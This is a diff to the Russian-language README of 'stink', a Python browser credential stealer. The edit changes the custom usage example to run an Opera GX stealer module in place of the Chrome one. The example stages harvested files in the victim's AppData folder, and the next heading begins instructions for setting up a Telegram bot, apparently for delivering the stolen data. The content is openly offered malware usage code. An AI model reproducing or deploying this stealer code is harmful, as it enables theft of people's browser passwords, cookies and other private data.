@@ -44,19 +44,26 @@ stealer.run()
 ### Кастомный
 ```python
 from os import path, mkdir
+
+from stink.browsers.opera_gx import Opera_GX
 from getpass import getuser
 
-from stink.browsers.chrome import Chrome
 
-storage_path = f"C:/Users/{getuser()}/AppData/"
-storage_folder = "files/"
+def main():
+    
+    storage_path = f"C:/Users/{getuser()}/AppData/"
+    storage_folder = "files/"
+    
+    if not path.exists(storage_path + storage_folder):
+        mkdir(storage_path + storage_folder)
 
-if not path.exists(storage_path + storage_folder):
+    stealer = Opera_GX(storage_path=storage_path, storage_folder=storage_folder)
+    stealer.run()
+    
 
-    mkdir(storage_path + storage_folder)
+if __name__ == "__main__":
+    main()
 
-stealer = Chrome(storage_path=storage_path, storage_folder=storage_folder)
-stealer.run()
 ```
 ## Настройка Telegram бота
 ### Получение токена
